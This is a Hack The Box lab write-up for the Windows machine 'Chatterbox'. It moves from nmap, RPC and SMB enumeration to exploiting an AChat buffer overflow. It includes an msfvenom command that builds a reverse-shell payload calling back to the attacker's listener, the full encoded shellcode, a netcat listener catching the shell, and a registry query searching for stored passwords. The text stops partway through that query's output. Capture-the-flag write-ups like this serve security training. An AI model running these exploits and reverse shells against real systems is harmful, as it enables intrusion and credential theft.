---
date: 2024-10-01
title: Chatterbox HTB Write-Up
machine_ip: 10.10.10.74
os: Windows
difficulty: Medium
my_rating: 2
tags:
  - Windows
  - PrivEsc
  - SMB
  - RPC
  - smbclient
  - rpcdump
  - nc
  - achat
  - BufferOverflow
  - MSFvenom
  - plink
  - nmap
  - netstat
  - wmiexec
  - winexec
  - PortForwarding
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Nmap
```
┌──(root㉿kali)-[~]
└─# nmap -A -p- -T4 10.10.10.74                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 17:15 PDT
Warning: 10.10.10.74 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.74
Host is up (0.12s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  tcpwrapped
9256/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/1%OT=135%CT=1%CU=43659%PV=Y%DS=2%DC=T%G=Y%TM=66F
OS:C9353%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S
OS:%TS=7)SEQ(SP=105%GCD=1%ISR=10B%TI=RD%CI=I%II=I%TS=8)OPS(O1=M53CNW8ST11%O
OS:2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)
OS:WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=
OS:2000%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%
OS:O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80
OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-02T05:26:50
|_  start_date: 2024-10-02T03:25:34
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h20m00s, deviation: 2h18m34s, median: 4h59m59s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-02T01:26:49-04:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   111.23 ms 10.10.14.1
2   111.64 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 719.50 seconds
```

- Ports 9255, 9256
```
┌──(root㉿kali)-[~]
└─# nmap -A -p9255,9256 -T4 10.10.10.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 17:28 PDT
Nmap scan report for 10.10.10.74
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat   AChat chat system
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9255/tcp)
HOP RTT       ADDRESS
1   115.24 ms 10.10.14.1
2   116.48 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.96 seconds
```

- Nmap script for enum shares, anonymous can read IPC$
```
┌──(root㉿kali)-[~/Downloads/CVE-2021-34527]
└─# nmap --script smb-enum-shares.nse -p445 10.10.10.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 16:36 PDT
Nmap scan report for 10.10.10.74
Host is up (0.93s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.74\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.74\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.74\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Nmap done: 1 IP address (1 host up) scanned in 220.68 seconds
```

- `rpcdump.py` output
```
┌──(root㉿kali)-[~/Downloads/CVE-2021-34527]
└─# rpcdump.py 10.10.10.74 -p 135
/usr/local/bin/rpcdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20240916.171021.65b774de', 'rpcdump.py')
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Retrieving endpoint list from 10.10.10.74
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49152]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\CHATTERBOX[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc091730]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\CHATTERBOX[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc091730]
          ncalrpc:[WMsgKRpc0964B1]

Protocol: N/A 
Provider: sysntfy.dll 
UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
Bindings: 
          ncalrpc:[LRPC-bdf98f9496ef317c3b]
          ncalrpc:[LRPC-f007bc652f4af5f635]
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 12E65DD8-887F-41EF-91BF-8D816C42C2E7 v1.0 Secure Desktop LRPC interface
Bindings: 
          ncalrpc:[WMsgKRpc0964B1]

Protocol: N/A 
Provider: wscsvc.dll 
UUID    : 06BBA54A-BE05-49F9-B0A0-30F790261023 v1.0 Security Center
Bindings: 
          ncalrpc:[OLEA26BBCF071A646968FB9600E30EB]
          ncalrpc:[dhcpcsvc6]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[Audiosrv]
          ncalrpc:[AudioClientRpc]
          ncacn_ip_tcp:10.10.10.74[49153]
          ncacn_np:\\CHATTERBOX[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: N/A 
Provider: dhcpcsvc6.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc6]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[Audiosrv]
          ncalrpc:[AudioClientRpc]
          ncacn_ip_tcp:10.10.10.74[49153]
          ncacn_np:\\CHATTERBOX[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: N/A 
Provider: dhcpcsvc.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc]
          ncalrpc:[Audiosrv]
          ncalrpc:[AudioClientRpc]
          ncacn_ip_tcp:10.10.10.74[49153]
          ncacn_np:\\CHATTERBOX[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: N/A 
Provider: nrpsrv.dll 
UUID    : 30ADC50C-5CBC-46CE-9A0E-91914789E23C v1.0 NRP server endpoint
Bindings: 
          ncalrpc:[Audiosrv]
          ncalrpc:[AudioClientRpc]
          ncacn_ip_tcp:10.10.10.74[49153]
          ncacn_np:\\CHATTERBOX[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
Provider: wevtsvc.dll 
UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49153]
          ncacn_np:\\CHATTERBOX[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: N/A 
Provider: gpsvc.dll 
UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 
Bindings: 
          ncalrpc:[LRPC-f007bc652f4af5f635]

Protocol: N/A 
Provider: srvsvc.dll 
UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49154]
          ncacn_np:\\CHATTERBOX[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: iphlpsvc.dll 
UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49154]
          ncacn_np:\\CHATTERBOX[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: IKEEXT.DLL 
UUID    : A398E520-D59A-4BDD-AA7A-3C1E0303A511 v1.0 IKE/Authip API
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49154]
          ncacn_np:\\CHATTERBOX[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: schedsvc.dll 
UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49154]
          ncacn_np:\\CHATTERBOX[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0 
Bindings: 
          ncacn_np:\\CHATTERBOX[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 
Bindings: 
          ncacn_np:\\CHATTERBOX[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: schedsvc.dll 
UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0 
Bindings: 
          ncalrpc:[senssvc]
          ncalrpc:[OLE58BBABD3B9F54485A80C4A6DE154]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : 3473DD4D-2E88-4006-9CBA-22570909DD10 v5.1 WinHttp Auto-Proxy Service
Bindings: 
          ncalrpc:[LRPC-945c87344901c89717]
          ncalrpc:[OLEA80D062755734B46A0015E35F4D8]

Protocol: N/A 
Provider: nsisvc.dll 
UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
Bindings: 
          ncalrpc:[LRPC-945c87344901c89717]
          ncalrpc:[OLEA80D062755734B46A0015E35F4D8]

Protocol: N/A 
Provider: spoolsv.exe 
UUID    : 4A452661-8290-4B36-8FBE-7F4093A94978 v1.0 Spooler function endpoint
Bindings: 
          ncalrpc:[spoolss]

Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
Provider: spoolsv.exe 
UUID    : AE33069B-A2A8-46EE-A235-DDFD339BE281 v1.0 Spooler base remote object endpoint
Bindings: 
          ncalrpc:[spoolss]

Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
Provider: spoolsv.exe 
UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Spooler function endpoint
Bindings: 
          ncalrpc:[spoolss]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-1af2f62eddb49f9e43]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-1af2f62eddb49f9e43]

Protocol: N/A 
Provider: BFE.DLL 
UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API
Bindings: 
          ncalrpc:[LRPC-1af2f62eddb49f9e43]

Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
Provider: services.exe 
UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49155]

Protocol: [MS-RPRN]: Print System Remote Protocol 
Provider: spoolsv.exe 
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 IPSec Policy agent endpoint
Bindings: 
          ncalrpc:[LRPC-2fdb1a7cde5aaf7147]
          ncacn_ip_tcp:10.10.10.74[49156]

Protocol: [MS-FASP]: Firewall and Advanced Security Protocol 
Provider: FwRemoteSvr.dll 
UUID    : 6B5BDD1E-528C-422C-AF8C-A4079BE4FE48 v1.0 Remote Fw APIs
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49156]

Protocol: [MS-CMPO]: MSDTC Connection Manager: 
Provider: msdtcprx.dll 
UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
Bindings: 
          ncalrpc:[LRPC-bb310798fb84be0400]
          ncalrpc:[LRPC-bb310798fb84be0400]
          ncalrpc:[LRPC-bb310798fb84be0400]
          ncalrpc:[LRPC-bb310798fb84be0400]

Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
Provider: samsrv.dll 
UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.74[49157]
          ncalrpc:[samss lpc]
          ncacn_np:\\CHATTERBOX[\PIPE\protected_storage]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncalrpc:[LRPC-a2b0856d34e7d9c3c1]
          ncacn_np:\\CHATTERBOX[\pipe\lsass]

Protocol: N/A 
Provider: sysmain.dll 
UUID    : B58AA02E-2884-4E97-8176-4EE06D794184 v1.0 
Bindings: 
          ncalrpc:[trkwks]
          ncacn_np:\\CHATTERBOX[\pipe\trkwks]
          ncalrpc:[OLE8B5D880610BC4EC3BBB8DAEF6CC2]

Protocol: N/A 
Provider: ssdpsrv.dll 
UUID    : 4B112204-0E19-11D3-B42B-0000F81FEB9F v1.0 
Bindings: 
          ncalrpc:[LRPC-36d0bc59bfb7c61916]

[*] Received 109 endpoints.
```

- anonymous SMB login (NULL creds)
```
┌──(root㉿kali)-[~]
└─# smbclient //10.10.10.74/IPC$             
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
# Foothold
- gain shell via exploit
- Searchsploit results for achat
```
┌──(root㉿kali)-[~/Downloads]
└─# searchsploit achat                                                             
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                                | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                                   | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                                      | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                                        | php/webapps/24647.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- achat exploit `36025.py`, Remote Buffer Overflow. 
- `cp /usr/share/exploitdb/exploits/windows/remote/36025.py achat.py`
- Edit `achat.py` and update `msfvenom` payload
```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.14.4 lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

- Copy above and paste into termnial to get new Buffer Overflow payload
```
┌──(root㉿kali)-[~/Downloads]
└─# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.14.4 lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3822 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x39\x6c\x39\x58\x62\x62\x4d\x30"
buf += b"\x4d\x30\x4b\x50\x71\x50\x33\x59\x7a\x45\x30\x31"
buf += b"\x65\x70\x32\x44\x52\x6b\x4e\x70\x4c\x70\x32\x6b"
buf += b"\x6e\x72\x5a\x6c\x72\x6b\x61\x42\x4c\x54\x32\x6b"
buf += b"\x50\x72\x4d\x58\x5a\x6f\x76\x57\x4f\x5a\x6d\x56"
buf += b"\x30\x31\x79\x6f\x46\x4c\x4d\x6c\x30\x61\x43\x4c"
buf += b"\x39\x72\x4e\x4c\x6d\x50\x45\x71\x36\x6f\x4a\x6d"
buf += b"\x49\x71\x37\x57\x57\x72\x4a\x52\x42\x32\x71\x47"
buf += b"\x42\x6b\x4e\x72\x4c\x50\x62\x6b\x4e\x6a\x6d\x6c"
buf += b"\x44\x4b\x70\x4c\x4b\x61\x32\x58\x48\x63\x4d\x78"
buf += b"\x79\x71\x67\x61\x72\x31\x44\x4b\x4f\x69\x6f\x30"
buf += b"\x4b\x51\x46\x73\x44\x4b\x4f\x59\x5a\x78\x7a\x43"
buf += b"\x6e\x5a\x51\x39\x52\x6b\x4c\x74\x64\x4b\x59\x71"
buf += b"\x39\x46\x6c\x71\x6b\x4f\x34\x6c\x57\x51\x36\x6f"
buf += b"\x4a\x6d\x4d\x31\x79\x37\x6d\x68\x4b\x30\x52\x55"
buf += b"\x78\x76\x4c\x43\x61\x6d\x39\x68\x4f\x4b\x43\x4d"
buf += b"\x6e\x44\x42\x55\x6b\x34\x71\x48\x72\x6b\x4f\x68"
buf += b"\x4f\x34\x7a\x61\x49\x43\x50\x66\x52\x6b\x7a\x6c"
buf += b"\x30\x4b\x62\x6b\x31\x48\x6d\x4c\x4a\x61\x6a\x33"
buf += b"\x52\x6b\x6c\x44\x44\x4b\x6b\x51\x66\x70\x75\x39"
buf += b"\x51\x34\x6b\x74\x4f\x34\x71\x4b\x4f\x6b\x73\x31"
buf += b"\x62\x39\x4f\x6a\x32\x31\x79\x6f\x37\x70\x4f\x6f"
buf += b"\x51\x4f\x70\x5a\x54\x4b\x6a\x72\x5a\x4b\x54\x4d"
buf += b"\x71\x4d\x33\x38\x6c\x73\x4c\x72\x49\x70\x6d\x30"
buf += b"\x53\x38\x62\x57\x51\x63\x50\x32\x61\x4f\x72\x34"
buf += b"\x33\x38\x6e\x6c\x62\x57\x6d\x56\x4b\x57\x39\x6f"
buf += b"\x47\x65\x35\x68\x76\x30\x6a\x61\x49\x70\x6b\x50"
buf += b"\x6d\x59\x35\x74\x32\x34\x32\x30\x51\x58\x4f\x39"
buf += b"\x71\x70\x62\x4b\x6b\x50\x39\x6f\x58\x55\x42\x30"
buf += b"\x72\x30\x6e\x70\x72\x30\x31\x30\x70\x50\x61\x30"
buf += b"\x4e\x70\x32\x48\x38\x6a\x7a\x6f\x57\x6f\x49\x50"
buf += b"\x69\x6f\x39\x45\x65\x47\x42\x4a\x4d\x35\x43\x38"
buf += b"\x6c\x4a\x4b\x5a\x4a\x6e\x4d\x34\x50\x68\x6c\x42"
buf += b"\x39\x70\x6b\x61\x51\x4c\x61\x79\x78\x66\x52\x4a"
buf += b"\x4e\x30\x61\x46\x62\x37\x62\x48\x32\x79\x47\x35"
buf += b"\x70\x74\x33\x31\x39\x6f\x4a\x35\x34\x45\x67\x50"
buf += b"\x31\x64\x7a\x6c\x79\x6f\x70\x4e\x4d\x38\x30\x75"
buf += b"\x68\x6c\x70\x68\x4c\x30\x57\x45\x55\x52\x50\x56"
buf += b"\x6b\x4f\x68\x55\x52\x48\x72\x43\x62\x4d\x32\x44"
buf += b"\x59\x70\x65\x39\x4b\x33\x6f\x67\x72\x37\x72\x37"
buf += b"\x4e\x51\x4c\x36\x32\x4a\x7a\x72\x30\x59\x52\x36"
buf += b"\x69\x52\x6b\x4d\x32\x46\x66\x67\x6e\x64\x4e\x44"
buf += b"\x4d\x6c\x4d\x31\x5a\x61\x72\x6d\x4f\x54\x4e\x44"
buf += b"\x4a\x70\x59\x36\x6b\x50\x51\x34\x62\x34\x72\x30"
buf += b"\x32\x36\x6f\x66\x71\x46\x70\x46\x31\x46\x6e\x6e"
buf += b"\x30\x56\x6f\x66\x72\x33\x71\x46\x61\x58\x74\x39"
buf += b"\x56\x6c\x4d\x6f\x74\x46\x6b\x4f\x47\x65\x71\x79"
buf += b"\x77\x70\x6e\x6e\x51\x46\x30\x46\x39\x6f\x30\x30"
buf += b"\x53\x38\x59\x78\x65\x37\x6b\x6d\x63\x30\x69\x6f"
buf += b"\x46\x75\x45\x6b\x5a\x50\x74\x75\x77\x32\x30\x56"
buf += b"\x42\x48\x35\x56\x44\x55\x55\x6d\x35\x4d\x6b\x4f"
buf += b"\x7a\x35\x6d\x6c\x6c\x46\x63\x4c\x39\x7a\x43\x50"
buf += b"\x49\x6b\x4b\x30\x34\x35\x4c\x45\x35\x6b\x30\x47"
buf += b"\x7a\x73\x43\x42\x30\x6f\x6f\x7a\x39\x70\x50\x53"
buf += b"\x49\x6f\x36\x75\x41\x41"
```

- Now copy this output and place it back into `achat.py` as the payload, replacing the old strings.
- Update the server_address = (192.168.91.130',9256) to that of the target
```
server_address = ('10.10.10.74', 9256)
```

- Save, and start `nc` listener
- Run exploit `achat.py`
```
┌──(root㉿kali)-[~/Downloads]
└─# python achat.py   
---->{P00F}!
```

- Caught a shell
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

# PrivEsc
- escalate from webshell to user to root
- Dump passwords with `reg query HKLM /f password /t REG_SZ /s`
```
C:\Windows\system32>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7be73787-ce71-4b33-b4c8-00d32b54bea8}
    (Default)    REG_SZ    HomeGroup Password

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
